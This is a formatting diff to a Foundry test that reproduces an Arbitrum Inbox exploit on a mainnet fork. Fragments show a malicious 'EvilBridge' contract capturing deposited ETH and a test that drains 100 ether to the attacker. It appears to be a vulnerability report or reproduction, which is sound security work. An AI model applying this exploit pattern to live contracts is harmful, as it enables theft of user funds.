@@ -13,8 +13,8 @@ interface IArbitrumInbox {
 }
 
 contract EvilBridge {
-
     address public immutable owner;
+
     fallback() external payable {}
     receive() external payable {}
 
@@ -22,7 +22,7 @@ contract EvilBridge {
         owner = msg.sender;
     }
 
-    function enqueueDelayedMessage(uint8, address, bytes32) external payable returns(uint256) {
+    function enqueueDelayedMessage(uint8, address, bytes32) external payable returns (uint256) {
         console.log("Victim's value received: %s", msg.value);
         // returns silly fake message number
         return 9999;
@@ -41,12 +41,13 @@ contract Report_ArbitrumInbox is TestHarness, TokenBalanceTracker {
     //vulnerable implementation 0x3e2198a77fc6b266082b92859092170763548730
     EvilBridge evilBridge;
 
-
     function setUp() external {
-        // The upgrade was activated at block 15447157 (I did a bisection over history with anvil + cast, was not fun do not try)
+        // The upgrade was activated at block 15447157 (I did a bisection over history with anvil + cast, was
+        // not fun do not try)
         // By block 15460000 it was patched with no change in the implementation,
         // probably by re-initializing the contract and avoiding calling the postUpgradeInit method
-        cheat.createSelectFork("mainnet", 15450000); // fork number fairly arbitrary, just when contract existed but before it was patched
+        cheat.createSelectFork(vm.envString("RPC_URL"), 15_450_000); // fork number fairly arbitrary, just
+            // when contract existed but before it was patched
 
         updateBalanceTracker(attacker);
         updateBalanceTracker(address(arbitrumInbox));
@@ -54,7 +55,7 @@ contract Report_ArbitrumInbox is TestHarness, TokenBalanceTracker {
 
     function test_attack() external {
         logBalancesWithLabel("Balances of attacker contract before:", attacker);
-        uint balanceBefore = attacker.balance;
+        uint256 balanceBefore = attacker.balance;
 
         cheat.startPrank(attacker);
         evilBridge = new EvilBridge();
@@ -66,12 +67,11 @@ contract Report_ArbitrumInbox is TestHarness, TokenBalanceTracker {
 
         arbitrumInbox.depositEth{value: 100 ether}();
         evilBridge.drain();
-        uint balanceAfter = attacker.balance;
+        uint256 balanceAfter = attacker.balance;
 
         updateBalanceTracker(attacker);
         updateBalanceTracker(address(arbitrumInbox));
         logBalancesWithLabel("Balances of attacker contract after:", attacker);
-
 
         assertEq(balanceAfter - balanceBefore, 100 ether);
     }
